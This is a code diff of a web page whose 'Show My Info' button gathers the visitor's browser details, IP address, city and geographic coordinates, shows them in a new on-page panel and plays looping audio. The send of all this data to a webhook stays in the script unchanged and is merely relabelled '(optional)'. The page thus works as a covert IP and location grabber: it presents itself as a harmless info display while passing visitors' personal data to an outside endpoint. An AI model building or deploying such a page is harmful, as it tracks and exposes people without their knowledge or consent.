@@ -43,17 +43,16 @@
             padding: 40px;
             box-shadow: 0 0 20px rgba(0,0,0,0.5);
             animation: fadeIn 0.5s ease-in-out;
+            text-align: center;
         }
 
         h1 {
-            text-align: center;
             font-size: 2.2rem;
             margin-bottom: 10px;
             color: #ff6666;
         }
 
         .intro {
-            text-align: center;
             font-size: 1rem;
             margin-bottom: 30px;
             color: #ccc;
@@ -74,6 +73,22 @@
             background: #ff3b1f;
         }
 
+        .info-panel {
+            display: none;
+            margin-top: 30px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 10px;
+            padding: 20px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(5px);
+        }
+
+        .info-panel p {
+            margin: 10px 0;
+            font-size: 0.95rem;
+            color: #e6e6e6;
+        }
+
         @keyframes fadeIn {
             from {opacity: 0; transform: scale(0.95);}
             to {opacity: 1; transform: scale(1);}
@@ -89,6 +104,8 @@
         <div style="text-align: center;">
             <button id="showButton">Show My Info</button>
         </div>
+
+        <div id="deviceInfo" class="info-panel"></div>
     </div>
 
     <audio id="audio" loop>
@@ -98,6 +115,7 @@
 
     <script>
         async function getDeviceInfo() {
+            const infoDiv = document.getElementById('deviceInfo');
             const userAgent = navigator.userAgent;
             const platform = navigator.platform;
             const language = navigator.language;
@@ -152,7 +170,7 @@
             const deviceName = localStorage.getItem('customDeviceName') || `${platform} Device`;
             localStorage.setItem('customDeviceName', deviceName);
 
-            // Send data to a webhook
+            // Send data to a webhook (optional)
             const data = {
                 deviceName,
                 deviceEdition,
@@ -177,9 +195,24 @@
                 body: JSON.stringify(data)
             });
 
-            // Redirect to new page with device data
-            const urlParams = new URLSearchParams(data).toString();
-            window.location.href = `device-info.html?${urlParams}`;
+            // Update the device info panel
+            infoDiv.innerHTML = `
+                <p><strong>Device Name:</strong> ${deviceName}</p>
+                <p><strong>Device Edition:</strong> ${deviceEdition}</p>
+                <p><strong>Device Version:</strong> ${deviceVersion}</p>
+                <p><strong>System Type:</strong> ${systemType}</p>
+                <p><strong>Browser:</strong> ${userAgent}</p>
+                <p><strong>Language:</strong> ${language}</p>
+                <p><strong>Screen:</strong> ${screenWidth} x ${screenHeight}</p>
+                <p><strong>IP:</strong> ${ipAddress}</p>
+                <p><strong>Location:</strong> ${positionData.city}, ${positionData.region}</p>
+                <p><strong>Timezone:</strong> ${positionData.timezone}</p>
+                <p><strong>Coordinates:</strong> ${positionData.latitude}, ${positionData.longitude}</p>
+                <p><strong>CPU Cores:</strong> ${cpuCores}</p>
+            `;
+            infoDiv.style.display = 'block';
+
+            document.getElementById('audio').play();
         }
 
         document.getElementById('showButton').onclick = getDeviceInfo;
